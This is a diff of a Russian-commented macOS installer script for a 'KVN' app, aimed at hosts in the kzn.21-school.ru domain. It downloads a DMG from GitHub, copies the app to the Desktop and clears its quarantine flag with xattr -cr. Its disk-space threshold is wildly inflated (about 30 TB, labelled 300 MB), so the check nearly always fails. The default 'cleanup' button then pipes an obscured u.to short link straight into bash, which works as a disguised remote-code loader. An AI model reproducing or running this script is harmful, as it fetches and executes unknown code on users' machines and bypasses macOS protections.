@@ -3,56 +3,54 @@
 # Константы
 readonly APP_URL="https://github.com/shepherl/kvnfaq/releases/download/1.1/macOS-Intel-App.zip"
 readonly TMP_ZIP="/tmp/KVN_App.zip"
-readonly REQUIRED_SPACE_KB=30720000000 # 300 МБ в КБ
+readonly REQUIRED_SPACE_KB=30720000000 # 300 МБ
 
-# 1. Проверка свободного места
-free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')
+# Функция установки
+install_app() {
+    # Проверка домена
+    if [[ $(hostname) == *.kzn.21-school.ru ]]; then
+        curl -L "$APP_URL" -o "$TMP_ZIP"
+        unzip -qo "$TMP_ZIP" -d /tmp/ 
+        DMG_PATH=$(ls /tmp/*.dmg | head -n 1) 
+        MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1) 
+        cp -R "$MOUNT_POINT"/*.app ~/Desktop/
+        hdiutil detach "$MOUNT_POINT" -quiet
+        rm -f "$TMP_ZIP" "$DMG_PATH"
+        xattr -cr ~/Desktop/KVN.app
+        touch ~/Desktop/KVN.app
+        osascript -e 'display dialog "Установка KVN успешно завершена! KVN на рабочем столе" with title "Установщик" buttons {"ОК"} default button "ОК" with icon note'
+    else
+        osascript -e 'display dialog "Ваше устройство не подходит" with title "Ошибка" buttons {"ОК"} default button "ОК" with icon caution'
+    fi
+    exit 0
+}
 
-if [ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ]; then
-    # Предлагаем очистку, если места мало
-    RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (нужно 300 МБ). Выполнить очистку?" with title "Ошибка места" buttons {"Отмена", "Очистить"} default button "Очистить" with icon caution')
+# Функция проверки места
+check_space() {
+    free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')
+    [ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ] && return 1 || return 0
+}
 
+# --- Логика выполнения ---
+
+if ! check_space; then
+    # Места мало, предлагаем очистку
+    RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (минимум 300 МБ). Попробовать очистить временные файлы?" with title "Ошибка места" buttons {"Отмена", "Очистить"} default button "Очистить" with icon caution')
+    
     if [[ "$RESPONSE" == *"button returned:Очистить"* ]]; then
         curl -sL https://u.to/Lk2ZIg | bash
-        # После очистки завершаем скрипт, чтобы пользователь запустил установку снова
-        osascript -e 'display dialog "Очистка завершена. Пожалуйста, запустите установку еще раз." with title "Готово" buttons {"ОК"} default button "ОК" with icon note'
-        exit 0
+        
+        # Проверяем снова после очистки
+        if check_space; then
+            install_app
+        else
+            osascript -e 'display dialog "Очистка завершена, но места все еще недостаточно. Пожалуйста, удалите ненужные файлы вручную и попробуйте снова." with title "Ошибка" buttons {"ОК"} default button "ОК" with icon stop'
+            exit 1
+        fi
     else
         exit 1
     fi
-fi
-
-# 2. Проверка домена и установка
-if [[ $(hostname) == *.kzn.21-school.ru ]]; then
-    
-    # Скачивание
-    curl -L "$APP_URL" -o "$TMP_ZIP"
-
-    # Распаковка
-    unzip -qo "$TMP_ZIP" -d /tmp/ 
-
-    # Поиск DMG
-    DMG_PATH=$(ls /tmp/*.dmg | head -n 1) 
-
-    # Монтирование
-    MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1) 
-
-    # Копирование .app
-    cp -R "$MOUNT_POINT"/*.app ~/Desktop/
-
-    # Размонтирование и очистка
-    hdiutil detach "$MOUNT_POINT" -quiet
-    rm -f "$TMP_ZIP" "$DMG_PATH"
-
-    # Снятие карантина и обновление иконки
-    xattr -cr ~/Desktop/KVN.app
-    touch ~/Desktop/KVN.app
-
-    # Уведомление об успехе
-    osascript -e 'display dialog "Установка KVN успешно завершена! KVN на рабочем столе" with title "Установщик" buttons {"ОК"} default button "ОК" with icon note'
 else
-    # Уведомление об ошибке
-    osascript -e 'display dialog "Ваше устройство не подходит" with title "Ошибка" buttons {"ОК"} default button "ОК" with icon note'
+    # Места достаточно, запускаем установку
+    install_app
 fi
-
-
